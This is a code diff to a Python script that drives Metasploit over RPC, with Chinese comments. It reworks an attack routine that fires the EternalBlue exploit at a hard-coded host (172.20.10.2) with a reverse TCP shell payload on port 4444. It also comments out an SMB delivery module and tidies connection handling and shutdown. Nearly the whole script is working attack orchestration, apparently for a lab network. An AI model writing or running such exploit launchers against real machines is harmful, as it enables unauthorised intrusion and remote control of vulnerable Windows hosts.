@@ -8,11 +8,10 @@ from pymetasploit3.msfrpc import MsfRpcClient
 
 from libs.GUI import GUI
 from libs.Logger import Logger
-from libs.Payloads import Payloads
 from libs.modules.Eternalblue import Eternalblue
-from libs.modules.SMB_Delivery import SMB_Delivery
+from libs.modules.list.Payload_List import REVERSE_TCP
 
-client: MsfRpcClient
+client: MsfRpcClient = None
 logger = Logger('Main')
 gui = GUI('My Console')
 stop_funcs: list[Callable] = []
@@ -48,6 +47,9 @@ async def connect_rpc():
     except pymetasploit3.msfrpc.MsfAuthError:
         logger.err('驗證失敗，無法連線到 RPC')
         sys.exit(1)
+    except:
+        logger.err('請檢查 RPC 是否已經開啟')
+        sys.exit(1)
 
 
 async def attack():
@@ -55,31 +57,32 @@ async def attack():
     異步攻擊線程
     """
 
-    # 建立客戶端
-    await connect_rpc()
-
     # 初始化攻擊
-    eternal_blue = Eternalblue(client, '172.20.10.2', Payloads.REVERSE_TCP)
-    smb_delivery = SMB_Delivery(client, SRVPORT=4445)
+    eternal_blue = Eternalblue(client, '172.20.10.2', REVERSE_TCP, LPORT=4444)
+    # smb_delivery = SMB_Delivery(client, REVERSE_TCP, SRVPORT=4445, LPORT=446)
 
     stop_funcs.append(eternal_blue.stop)
-    stop_funcs.append(smb_delivery.stop)
+
+    # stop_funcs.append(smb_delivery.stop)
 
     @eternal_blue.event
     async def on_read(text):
         gui.println(text)
 
-    @smb_delivery.event
-    async def on_read(text):
-        gui.println(text)
+    # @smb_delivery.event
+    # async def on_read(text):
+    #     gui.println(text)
 
     await asyncio.gather(
         eternal_blue.run(),
-        smb_delivery.run(),
+        # smb_delivery.run(),
     )
 
 
 async def main():
+    # 建立客戶端
+    await connect_rpc()
+
     attack_thread = threading.Thread(target=lambda: asyncio.run(attack()))
     attack_thread.start()
 
@@ -89,7 +92,8 @@ async def main():
     for func in stop_funcs:
         func()
     attack_thread.join()
-    client.logout()
+    if client:
+        client.logout()
 
     logger.succ('關閉完成')
 
